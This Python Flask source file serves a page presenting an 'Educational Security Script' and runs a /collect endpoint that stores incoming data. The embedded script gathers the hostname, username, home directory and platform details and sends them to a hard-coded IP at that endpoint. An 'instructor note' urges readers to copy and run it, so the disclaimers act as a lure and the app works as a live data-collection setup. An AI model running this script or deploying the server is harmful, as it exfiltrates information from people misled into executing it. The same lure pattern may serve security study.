from flask import Flask, render_template, request, jsonify
import json
import os
from datetime import datetime

app = Flask(__name__)

DATA_DIR = "collected_data"
if not os.path.exists(DATA_DIR):
    os.makedirs(DATA_DIR)

@app.route('/forum')
def forum():
    return render_template('forum.html')


@app.route('/educational_script')
def educational_script():
    return """
<!DOCTYPE html>
<html>
<head>
    <title>Educational Security Script</title>
    <style>
        body { font-family: Arial, sans-serif; max-width: 800px; margin: 0 auto; padding: 20px; }
        .code { background-color: #f5f5f5; padding: 15px; border-radius: 5px; overflow-x: auto; font-family: monospace; }
        .warning { background-color: #ffdddd; padding: 10px; border-radius: 5px; margin: 15px 0; }
        .note { background-color: #e6f7ff; padding: 10px; border-radius: 5px; margin: 15px 0; }
        h1, h2 { color: #333; }
    </style>
</head>
<body>
    <h1>Educational Security Script</h1>

    <div class="warning">
        <strong>Educational Purpose Only:</strong> This script demonstrates security concepts and should only be run in a controlled environment for educational purposes.
    </div>

    <p>This script demonstrates how attackers might collect and exfiltrate system information. Understanding these techniques is crucial for security professionals.</p>

    <h2>Script Analysis</h2>

    <div class="code">
        <pre>
# EDUCATIONAL SECURITY SCRIPT
# This script demonstrates data collection and exfiltration techniques
# FOR CLASSROOM DEMONSTRATION ONLY

import os
import platform
import socket
import requests
import json
import time

def educational_system_analysis():
    # Demonstrates how attackers might collect system information.
    # This is for educational purposes only in a cybersecurity course.
 
    print("Starting educational system analysis demonstration...")
    time.sleep(1)

    # Collect system information (similar to what malware might collect)
    system_info = {
        "hostname": socket.gethostname(),
        "platform": platform.platform(),
        "processor": platform.processor(),
        "python_version": platform.python_version(),
        "username": os.getlogin() if hasattr(os, 'getlogin') else 'unknown',
        "home_directory": os.path.expanduser("~"),
        "current_directory": os.getcwd(),
    }

    # Create a report file (demonstrates file creation)
    report_path = os.path.join(os.getcwd(), "security_demo_report.txt")
    with open(report_path, "w") as f:
        f.write("=== Security Demonstration Report ===\n\n")
        for key, value in system_info.items():
            f.write(f"{key}: {value}\n")

    print(f"Demonstration report created at: {report_path}")

    # Demonstrate how data might be exfiltrated
    try:
        print("Demonstrating data exfiltration technique...")
        # In a real attack, this would send to an attacker's server
        # For this demo, we'll send to our local server
        response = requests.post(
            "http://192.168.31.139:5000/collect",
            json=system_info,
            headers={"Content-Type": "application/json"},
            timeout=5
        )
        print("Exfiltration demonstration complete")
    except Exception as e:
        print(f"Exfiltration demonstration failed: {e}")

    print("Educational demonstration complete!")
    return system_info

# For classroom demonstration
if __name__ == "__main__":
    educational_system_analysis()
        </pre>
    </div>

    <div class="note">
        <p><strong>Instructor Note:</strong> To test this script for your classroom demonstration, you can copy and run it in a Python environment. This will show students how information collection works in practice.</p>

        <p>Copy the script above and save it as <code>security_demo.py</code>, then run it with <code>python security_demo.py</code></p>
    </div>

    <h2>Learning Objectives</h2>
    <ul>
        <li>Understand how malicious scripts can collect system information</li>
        <li>Learn about data exfiltration techniques</li>
        <li>Recognize patterns that might indicate malicious code</li>
        <li>Develop strategies to protect against such attacks</li>
    </ul>
</body>
</html>
    """

@app.route('/collect', methods=['POST'])
def collect():
    """Endpoint to collect data sent by the script"""
    try:
        data = request.json

        data['timestamp'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        if not os.path.exists('collected_data'):
            os.makedirs('collected_data')

        filename = f"collected_data/system_info_{data.get('hostname', 'unknown')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

        print(f"Received data from {data.get('hostname', 'unknown')}:")
        for key, value in data.items():
            print(f"  {key}: {value}")

        return jsonify({"status": "success", "message": "Data received and stored"}), 200

    except Exception as e:
        print(f"Error processing collected data: {e}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/favicon.ico')
def favicon():
    return ""

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')